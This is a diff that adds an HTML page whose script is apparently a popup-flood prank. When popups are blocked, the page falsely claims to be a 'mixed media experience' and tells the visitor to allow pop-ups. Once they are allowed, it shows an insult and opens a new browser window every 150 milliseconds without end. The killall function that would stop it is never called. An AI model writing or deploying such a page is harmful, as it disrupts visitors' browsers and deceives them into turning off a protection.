@@ -1,0 +1,49 @@
+<html>
+<script>
+window.opened = window.open("/animation.html", 'original', 'resizable');
+try {
+  window.opened && window.opened.moveTo(99999,99999);
+}
+catch(e) {
+
+}
+setTimeout(function() {
+  if(window.stopped){
+    console.log('stopped.')
+    return;
+  }
+  if (window.opened === null) {
+    var element = document.getElementById('info')
+    element.innerHTML = 'There is a problem loading in your browser. <br/> <br/> This website plays a mixed media experience.<br/> <br/>  Please ensure popups are enabled by clicking the icon on the right of your address bar and selecting \'Always allow pop-ups\' and then refresh the page <br/> <button onclick=\'document.location.reload()\'>Refresh</button>';
+  }
+  else {
+    var element = document.getElementById('info')
+    element.innerHTML = 'fuk u';
+    window.windowz = [];
+    var i = 0;
+    var newOpen = function() {
+      var opened = window.open("animation.html", 'myName' + i, 'resizable');
+      opened.moveTo(i*50, i*50);
+      window.windowz.push(opened);
+      i++;
+      setTimeout(newOpen, 150)
+    }
+    newOpen();
+  }
+}, 150);
+
+function killall() {
+  console.log('kill all');
+  window.stopped = true;
+  window.opened.close();
+  window.windowz.forEach(function(window){
+    window.close();
+  })
+}
+</script>
+
+<div id="info">
+Loading...
+</div>
+
+</html>
